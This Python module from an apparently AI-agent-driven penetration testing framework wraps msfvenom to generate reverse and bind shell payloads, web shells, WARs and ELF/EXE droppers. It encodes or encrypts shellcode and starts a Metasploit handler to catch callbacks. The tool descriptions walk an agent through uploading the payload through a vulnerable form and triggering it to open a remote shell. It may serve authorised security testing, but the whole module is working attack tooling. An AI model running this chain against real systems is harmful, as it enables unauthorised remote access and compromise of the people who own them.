"""msfvenom payload generation — the file-upload vulnerability testing lane.

The framework has deep Metasploit-RPC wiring (payloads/metasploiting.py) but
no way to *generate* payload artifacts for upload vectors: a web shell to
push through a vulnerable upload form, a WAR for a tomcat manager deploy, an
ELF/EXE dropper.  This module is that gap, closed end to end:

    generate_payload  ->  session_upload  ->  session_get (trigger)
                                                   |
    generate_payload(start_handler=True) < catches the callback

Every generated artifact lands in the gitignored ``dropbox/`` folder at the
repo root (override via ``MSFVENOM_DROPBOX``); the returned ``out_path`` is
the value to hand to ``auxiliaries.web_session.session_upload`` — the
multipart upload tool that carries cookie-jar state, auto-injects CSRF, and
per-hop scope-gates every request like all framework HTTP.

SCOPE GATE: NONE for generation, deliberately.  msfvenom is offline compute
on this box — nothing contacts a target and no engagement data egresses
(same class as hash_crack / crypto_kit).  The gate fires where it matters:
``session_upload`` and the trigger ``session_get`` are gated, and the
callback handler is an inbound *listener* (exploit/multi/handler job), not
outbound traffic.

METERPRETER: generation is allowed — the old AutoLoadExtensions serialization
bug no longer reproduces on current msfrpcd, mirroring the unblocked
``dispatch_metasploit`` (launches verified, non-null job_id).  Pure shell
payloads remain the preset defaults; meterpreter stays an explicit choice.
"""

from __future__ import annotations

import asyncio
import hashlib
import os
import re
import shlex
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from constants import TransportType, framework_tool

_REPO_ROOT = Path(__file__).resolve().parents[1]
DROPBOX_DIR = Path(os.getenv("MSFVENOM_DROPBOX", str(_REPO_ROOT / "dropbox")))

MSFVENOM_CANDIDATES = ("/usr/bin/msfvenom", "/usr/local/bin/msfvenom", "/opt/metasploit-framework/msfvenom")
MSFVENOM_TIMEOUT = float(os.getenv("MSFVENOM_TIMEOUT", "300"))
MENU_MAX_ROWS = int(os.getenv("MSFVENOM_MENU_MAX_ROWS", "80"))
_STDERR_TAIL = 800

# Payload name sanity — msfvenom's own vocabulary is [a-z0-9_/.-].  argv is
# list-based (no shell) so this is belt-and-braces, not injection defense.
_SAFE_TOKEN = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9_/.-]*$")
_SAFE_FILENAME = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9_.-]*$")

# Upload-testing presets: web platform -> (default payload, msfvenom format,
# file extension).  Each default payload is a pure shell payload whose
# handler works through dispatch_metasploit; presets stay pure shell by design.
PRESETS: Dict[str, Tuple[str, str, str]] = {
    "php":    ("php/reverse_php",           "raw",  ".php"),
    "php_bind": ("php/bind_php",            "raw",  ".php"),
    "jsp":    ("java/jsp_shell_reverse_tcp", "raw",  ".jsp"),
    "war":    ("java/jsp_shell_reverse_tcp", "war",  ".war"),
    "aspx":   ("windows/x64/shell_reverse_tcp", "aspx", ".aspx"),
    "asp":    ("windows/shell_reverse_tcp", "asp",  ".asp"),
    "python": ("python/shell_reverse_tcp",  "raw",  ".py"),
    "nodejs": ("nodejs/shell_reverse_tcp",  "raw",  ".js"),
    "ruby":   ("ruby/shell_reverse_tcp",    "raw",  ".rb"),
    "elf":    ("linux/x64/shell_reverse_tcp", "elf", ".bin"),
    "exe":    ("windows/x64/shell_reverse_tcp", "exe", ".exe"),
}

_KINDS = ("payloads", "formats", "encoders", "platforms", "archs")


def _locate_msfvenom() -> Optional[str]:
    """Find the msfvenom binary. Env override ``MSFVENOM_BIN`` first (same
    pattern as hash_crack's JOHN_BIN/HASHCAT_BIN), then known paths, then PATH."""
    env_bin = os.getenv("MSFVENOM_BIN")
    if env_bin and os.path.isfile(env_bin) and os.access(env_bin, os.X_OK):
        return env_bin
    for cand in MSFVENOM_CANDIDATES:
        if os.path.isfile(cand) and os.access(cand, os.X_OK):
            return cand
    return shutil.which("msfvenom")


def _fail(error: str, **extra) -> Dict[str, Any]:
    """Uniform Failed envelope so the executor surfaces status=Failed and
    the secretary narrates instead of treating a dict as success."""
    out: Dict[str, Any] = {"status": "Failed", "error": error}
    out.update(extra)
    return out


def _tail(text: str, limit: int = _STDERR_TAIL) -> str:
    text = (text or "").strip()
    if len(text) <= limit:
        return text
    return "..." + text[-limit:]


@framework_tool(
    "Browse msfvenom's catalog: payloads, output formats, encoders, "
    "platforms, or architectures, filtered by a substring query. Also knows "
    "--encrypt methods for generate_payload's encrypt= param (AES/RC4/XOR "
    "shellcode). Use this "
    "BEFORE generate_payload whenever unsure of an exact name — msfvenom "
    "refuses misspelled payloads/formats with a plain 'Invalid Payload "
    "Selected'. kind='payloads' shows the payload table (~2600 entries; "
    "pass a query like 'php' or 'reverse' to narrow — output is capped), "
    "kind='formats' shows executable formats (elf, exe, war, aspx, ...) and "
    "transform formats (raw, py, base64, ...) together. Offline — no target "
    "contact, no scope gate.",
    tags=["exploit.msf"],
)
async def msfvenom_menu(kind: str = "payloads", query: str = "") -> Dict[str, Any]:
    """List msfvenom payloads/formats/encoders, filtered by ``query``.

    Args:
        kind: One of 'payloads', 'formats', 'encoders', 'platforms', 'archs'.
        query: Case-insensitive substring filter (e.g. 'php', 'jsp',
            'reverse_tcp', 'shikata'). Empty = unfiltered (capped).
    """
    bin_path = _locate_msfvenom()
    if not bin_path:
        return _fail(
            "msfvenom binary not found. Install metasploit-framework "
            "(apt install metasploit-framework) or point MSFVENOM_BIN at it "
            "in the root-0600 .env."
        )
    kind = (kind or "payloads").strip().lower()
    if kind not in _KINDS:
        return _fail(f"kind must be one of {_KINDS} — got {kind!r}.")
    try:
        proc = await asyncio.to_thread(
            subprocess.run,
            [bin_path, "--list", kind],
            capture_output=True, text=True, timeout=60,
        )
    except subprocess.TimeoutExpired:
        return _fail(f"msfvenom --list {kind} timed out after 60s.")
    if proc.returncode != 0:
        return _fail(f"msfvenom --list {kind} failed: {_tail(proc.stderr)}")
    lines = proc.stdout.splitlines()
    needle = (query or "").strip().lower()
    hits = [ln.rstrip() for ln in lines if ln.strip() and needle in ln.lower()]
    total = sum(1 for ln in lines if ln.strip())
    truncated = len(hits) > MENU_MAX_ROWS
    return {
        "status": "Success",
        "kind": kind,
        "query": needle,
        "matches": len(hits),
        "total_listed": total,
        "truncated": truncated,
        "rows": hits[:MENU_MAX_ROWS],
        "hint": (
            f"{len(hits)} matching of {total} lines"
            + (" — narrowed by a more specific query for the full picture" if truncated else "")
        ),
    }


@framework_tool(
    "Generate a payload artifact with msfvenom — the payload-generation "
    "primitive for file upload vulnerability testing. Produces a real file "
    "(web shell, WAR, ELF/EXE dropper, script stager) in the gitignored "
    "dropbox/ folder and returns its absolute out_path plus sha256 and size. "
    "Preset names (php, jsp, war, aspx, asp, python, nodejs, ruby, elf, exe) "
    "fill payload+format+extension defaults for a target stack — e.g. "
    "preset='war' yields a deployable java/jsp_shell_reverse_tcp WAR. "
    "Meterpreter payloads also generate (old RPC block removed, mirroring "
    "dispatch_metasploit); pure shell payloads remain the preset default. "
    "start_handler=True additionally "
    "starts a persistent exploit/multi/handler job (same PAYLOAD/LHOST/LPORT) "
    "so the uploaded shell's callback is caught — use it when the target can "
    "route back to LHOST; for targets that cannot reach you, use a *bind* "
    "payload and connect after trigger. Offline generation, no scope gate; "
    "the later session_upload and trigger steps ARE gated. Next: "
    "session_upload(file_path=<out_path>) through the vulnerable endpoint, "
    "then session_get the uploaded file's URL to trigger the callback.",
    tags=["exploit.msf"],
    next_hints=[
        "session_upload(url=<upload endpoint>, file_path=<out_path>)",
        "session_get the uploaded file's URL to trigger the shell",
        "dispatch_metasploit list_sessions after the callback fires",
    ],
)
async def generate_payload(
    payload: Optional[str] = None,
    lhost: str = "",
    lport: int = 0,
    preset: Optional[str] = None,
    format: Optional[str] = None,  # noqa: A002 - mirrors msfvenom's own term
    out_name: Optional[str] = None,
    encoder: Optional[str] = None,
    iterations: int = 1,
    badchars: Optional[str] = None,
    platform: Optional[str] = None,
    arch: Optional[str] = None,
    encrypt: Optional[str] = None,
    encrypt_key: Optional[str] = None,
    encrypt_iv: Optional[str] = None,
    extra_options: Optional[Dict[str, Any]] = None,
    start_handler: bool = False,
) -> Dict[str, Any]:
    """Run msfvenom to produce a payload file in ``dropbox/``.

    Args:
        payload: Full msfvenom payload name (e.g. 'php/reverse_php',
            'java/jsp_shell_reverse_tcp'). Optional when ``preset`` is given
            (the preset's default is used); required otherwise.
        lhost: The IP the TARGET connects back to (reverse payloads). Must
            be routable from the target — for unreachable-callback targets
            use a bind payload instead.
        lport: Callback/connect port, 1-65535.
        preset: One of php, php_bind, jsp, war, aspx, asp, python, nodejs,
            ruby, elf, exe — fills default payload/format/extension for that
            upload stack. Explicit payload/format args override the preset.
        format: msfvenom output format (raw, war, aspx, asp, elf, exe,
            dll, jsp, py, base64, ...). Default: the preset's format, else
            'raw'. See msfvenom_menu(kind='formats').
        out_name: Output filename inside dropbox/ (no path separators).
            Default: derived from payload+extension.
        encoder: msfvenom encoder (e.g. x86/shikata_ga_nai); see
            msfvenom_menu(kind='encoders').
        iterations: Encoder run count (needs ``encoder`` when > 1).
        badchars: Characters for msfvenom to avoid (e.g. '\\x00\\xff').
        platform: Explicit --platform (e.g. linux, windows).
        arch: Explicit architecture (-a x86/x64).
        extra_options: Extra VAR=VALUE payload options appended to the
            command (e.g. {'URI': '/x'}).
        encrypt: Encrypt the raw shellcode with a real cipher instead of (or
            alongside) an encoder chunk: 'aes256', 'aes256cbc', 'rc4', 'xor',
            'base64' etc (msfvenom_menu(kind='encrypt')). Emits ENCRYPTED RAW
            SHELLCODE ONLY — no decryptor is baked in; pair with a loader from
            the encoders/ lane.
        encrypt_key: Cipher key as a hex string (e.g. 32 bytes = 64 hex chars
            for aes256). Required with encrypt except for 'base64'.
        encrypt_iv: Initialization vector (hex). Optional; auto-generated when
            omitted. Valid for aes256cbc.
        start_handler: Also start a persistent exploit/multi/handler job via
            the MSF RPC lane to catch the callback (same payload/LHOST/LPORT).
    """
    # Argument validation runs BEFORE the binary probe: generation is offline
    # compute, and on a box without msfvenom the binary-absent error must not
    # mask bad-argument errors. The probe happens just before argv build.
    preset = (preset or "").strip().lower() or None
    if preset is not None and preset not in PRESETS:
        return _fail(
            f"Unknown preset {preset!r}. Valid: {', '.join(sorted(PRESETS))}. "
            "Or call msfvenom_menu to browse payloads/formats and pass "
            "payload/format explicitly."
        )
    if preset:
        default_payload, preset_format, ext = PRESETS[preset]
    else:
        default_payload, preset_format, ext = None, "raw", ".bin"

    payload = (payload or "").strip() or default_payload
    if not payload:
        return _fail(
            "No payload given: pass payload= (see msfvenom_menu) or a preset "
            f"({'/'.join(sorted(PRESETS))}) which supplies a default payload."
        )
    if not _SAFE_TOKEN.match(payload):
        return _fail(f"Invalid payload name {payload!r} — use a name from msfvenom_menu.")

    # Meterpreter payloads generate fine — mirroring the unblocked dispatch
    # lane (its old hard block was written for a pymetasploit3/MSF combo where
    # AutoLoadExtensions serialized non-scalar; that bug no longer reproduces,
    # verified on current msfrpcd per dispatch_metasploit's note).  Presets
    # deliberately stay pure-shell.

    fmt = (format or preset_format or "raw").strip().lower()
    if not _SAFE_TOKEN.match(fmt):
        return _fail(f"Invalid format {fmt!r} — see msfvenom_menu(kind='formats').")

    if out_name:
        if not _SAFE_FILENAME.match(out_name):
            return _fail(
                f"Invalid out_name {out_name!r}: bare filename only (no path "
                "separators) — the file lands in the dropbox folder."
            )
    else:
        out_name = payload.replace("/", "_") + ext

    if not lhost:
        return _fail(
            "lhost is required — the IP the target calls back to (must be "
            "routable FROM the target). For targets that cannot reach you, "
            "use a bind payload (php/bind_php, */shell_bind_tcp) and connect "
            "to it after triggering."
        )
    try:
        lport = int(lport)
    except (TypeError, ValueError):
        return _fail(f"lport must be an integer 1-65535 — got {lport!r}.")
    if not (1 <= lport <= 65535):
        return _fail(f"lport must be 1-65535 — got {lport}.")

    iterations = int(iterations or 1)
    if iterations < 1:
        return _fail(f"iterations must be >= 1 — got {iterations}.")
    if iterations > 1 and not encoder:
        return _fail(
            "iterations>1 requires an encoder (pass encoder=, e.g. "
            "'x86/shikata_ga_nai' — see msfvenom_menu(kind='encoders'))."
        )
    if encoder and not _SAFE_TOKEN.match(encoder):
        return _fail(f"Invalid encoder {encoder!r} — see msfvenom_menu(kind='encoders').")

    bin_path = _locate_msfvenom()
    if not bin_path:
        return _fail(
            "msfvenom binary not found. Install metasploit-framework "
            "(apt install metasploit-framework) or point MSFVENOM_BIN at it "
            "in the root-0600 .env."
        )

    argv: List[str] = [bin_path, "-p", payload, f"LHOST={lhost}", f"LPORT={lport}"]
    for key, val in (extra_options or {}).items():
        if not re.fullmatch(r"[A-Za-z][A-Za-z0-9_]*", str(key)):
            return _fail(f"Invalid extra option name {key!r}.")
        argv.append(f"{key}={val}")
    argv += ["-f", fmt, "-o", str(DROPBOX_DIR / out_name)]
    if encoder:
        argv += ["-e", encoder]
        if iterations > 1:
            argv += ["-i", str(iterations)]
    if badchars:
        argv += ["-b", badchars]
    if platform:
        if not _SAFE_TOKEN.match(platform):
            return _fail(f"Invalid platform {platform!r}.")
        argv += ["--platform", platform]
    if arch:
        if not _SAFE_TOKEN.match(arch):
            return _fail(f"Invalid arch {arch!r}.")
        argv += ["-a", arch]
    if encrypt:
        if not _SAFE_TOKEN.match(encrypt):
            return _fail(f"Invalid encrypt method {encrypt!r} — see msfvenom_menu(kind='encrypt').")
        if encrypt != "base64" and not (encrypt_key or "").strip():
            return _fail(
                "encrypt_key is required for cipher methods (hex string; e.g. "
                "aes256 wants 64 hex chars = 32 bytes). base64 needs no key."
            )
        argv += ["--encrypt", encrypt]
        key = (encrypt_key or "").strip()
        if key:
            try:
                bytes.fromhex(key)
            except ValueError:
                return _fail(f"Invalid encrypt_key {key!r}: not a hex string.")
            argv += ["--encrypt-key", key]
        iv = (encrypt_iv or "").strip()
        if iv:
            if iv.lower().startswith("0x"):
                return _fail("encrypt_iv must be the bare hex bytes, no 0x prefix.")
            try:
                bytes.fromhex(iv)
            except ValueError:
                return _fail(f"Invalid encrypt_iv {iv!r}: not a hex string.")
            argv += ["--encrypt-iv", iv]

    try:
        DROPBOX_DIR.mkdir(parents=True, exist_ok=True)
    except OSError as e:
        return _fail(f"Cannot create dropbox dir {DROPBOX_DIR}: {e}")

    try:
        proc = await asyncio.to_thread(
            subprocess.run,
            argv,
            capture_output=True, text=True, timeout=MSFVENOM_TIMEOUT,
        )
    except subprocess.TimeoutExpired:
        return _fail(
            f"msfvenom timed out after {MSFVENOM_TIMEOUT:.0f}s — large encoders "
            "with high iteration counts can take minutes; retry simpler or "
            "raise MSFVENOM_TIMEOUT."
        )
    except OSError as e:
        return _fail(f"msfvenom could not be executed: {e}")

    out_path = DROPBOX_DIR / out_name
    if proc.returncode != 0 or not out_path.is_file():
        # msfvenom writes misspellings etc. to stderr verbatim ('Invalid
        # Payload Selected', 'Invalid format') — surface it, plus the argv
        # so the operator sees exactly what ran.
        return _fail(
            f"msfvenom failed: {_tail(proc.stderr) or _tail(proc.stdout)}",
            command=" ".join(shlex.quote(a) for a in argv),
            returncode=proc.returncode,
        )

    data = out_path.read_bytes()
    envelope: Dict[str, Any] = {
        "status": "Success",
        "payload": payload,
        "format": fmt,
        "preset": preset,
        "out_path": str(out_path),
        "out_name": out_name,
        "size_bytes": len(data),
        "sha256": hashlib.sha256(data).hexdigest(),
        "command": " ".join(shlex.quote(a) for a in argv),
        "msfvenom_tail": _tail(proc.stderr or proc.stdout, 400),
        "handler": None,
    }

    if start_handler:
        envelope["handler"] = await _start_catch_handler(payload, lhost, lport)
        # Generation succeeded either way — a failed handler is its own
        # error inside the envelope, not a failed generation.
    envelope["next"] = [
        f"session_upload(url=<upload endpoint>, file_path={out_name!r})",
        "session_get the uploaded file's URL to trigger the callback",
    ]
    return envelope


async def _start_catch_handler(payload: str, lhost: str, lport: int) -> Dict[str, Any]:
    """Start an exploit/multi/handler job via the MSF RPC lane for a just-
    generated payload.  Lazy import keeps the Brain's startup scan of this
    module free of the metasploiting dependency (and its dotenv/RPC state)
    — only a start_handler=True call pays for it."""
    handler: Dict[str, Any] = {
        "started": False, "payload": payload, "lhost": lhost, "lport": lport,
        "job_id": None, "error": None,
    }
    try:
        from payloads.metasploiting import MetasploitClient

        client = MetasploitClient.get_instance()
        if not await client._ensure_running():
            handler["error"] = (
                "MSF RPC could not be started (msfrpcd down?). The payload "
                "file is generated and ready; start the catch listener later "
                "via dispatch_metasploit(exploit/multi/handler) or retry."
            )
            return handler
        job_id, err = await client._start_handler_job(payload, lhost, lport)
        handler["job_id"] = job_id
        handler["started"] = job_id is not None
        handler["error"] = err
        if job_id is not None:
            handler["sessions_hint"] = (
                "Listener bound; after triggering the payload, new sessions "
                "appear via list_sessions / interact_session."
            )
    except Exception as e:  # noqa: BLE001 - generation result must survive
        handler["error"] = f"handler wiring failed: {e}"
    return handler


@framework_tool(
    "List payload artifacts in the framework dropbox folder (msfvenom "
    "output): filename, size, sha256, mtime. Use it to find a payload "
    "generated earlier in the engagement when the out_path was lost from "
    "context, before session_upload or re-generation. Offline, no scope "
    "gate.",
    tags=["exploit.msf"],
)
def list_dropbox() -> Dict[str, Any]:
    """List generated payload artifacts in ``dropbox/``."""
    try:
        DROPBOX_DIR.mkdir(parents=True, exist_ok=True)
        entries = [
            p for p in sorted(DROPBOX_DIR.iterdir())
            if p.is_file() and p.name not in (".gitkeep", "README.md")
        ]
    except OSError as e:
        return _fail(f"Cannot read dropbox dir {DROPBOX_DIR}: {e}")
    rows: List[Dict[str, Any]] = []
    for p in entries:
        try:
            data = p.read_bytes()
            rows.append({
                "name": p.name,
                "size_bytes": len(data),
                "sha256": hashlib.sha256(data).hexdigest(),
                "modified": time.strftime(
                    "%Y-%m-%d %H:%M:%S", time.localtime(p.stat().st_mtime)
                ),
            })
        except OSError as e:
            rows.append({"name": p.name, "error": str(e)})
    return {
        "status": "Success",
        "dropbox": str(DROPBOX_DIR),
        "count": len(rows),
        "files": rows,
    }


__all__ = ["msfvenom_menu", "generate_payload", "list_dropbox"]
